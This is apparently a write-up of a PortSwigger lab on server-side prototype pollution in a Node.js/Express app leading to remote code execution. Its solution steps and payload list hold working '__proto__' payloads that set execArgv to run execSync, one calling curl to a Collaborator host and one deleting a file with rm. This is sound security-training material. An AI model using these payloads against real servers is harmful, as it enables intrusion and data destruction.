# Lab: Remote code execution via server-side prototype pollution

**Official lab URL:** https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

## Lab idea

This Node.js and Express challenge explores how server-side prototype pollution can reach a command-execution gadget when privileged functionality is triggered. It practices identifying the high-level source-to-gadget-to-sink chain and understanding the potential for remote code execution.

## Vulnerability in brief
Prototype pollution is a JavaScript vulnerability class in which attacker-controlled input changes properties on an object prototype, most often the global `Object.prototype`. Other objects may then inherit those properties through JavaScript's prototype chain. A common cause is recursively merging an input object into an existing object without safely handling special property keys such as `__proto__` or constructor-related paths. Potential sources include URL query or fragment data, JSON input, and web messages.

## Solution idea
1. Log in and visit your account page.
2. In Burp, go to the Proxy > HTTP history tab and find the POST /my-account/change-address request.
3. Observe that when you submit the form, the data from the fields is sent to the server as JSON.
4. Send the request to Burp Repeater.
- …
6. In Burp, go to the Collaborator tab and poll for interactions.
7. In Repeater, replace the curl command with a command for deleting Carlos's file: "__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
8. Go back to the admin panel and trigger the maintenance jobs again.

## Payloads / key values
- `POST /my-account/change-address`
- `__proto__`
- `json spaces`
- `"__proto__": { "json spaces":10 }`
- `execArgv`
- `--eval`
- `execSync()`
- `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }`
- `curl`
- `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }`

## Official source
- [PortSwigger Academy: Lab: Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)
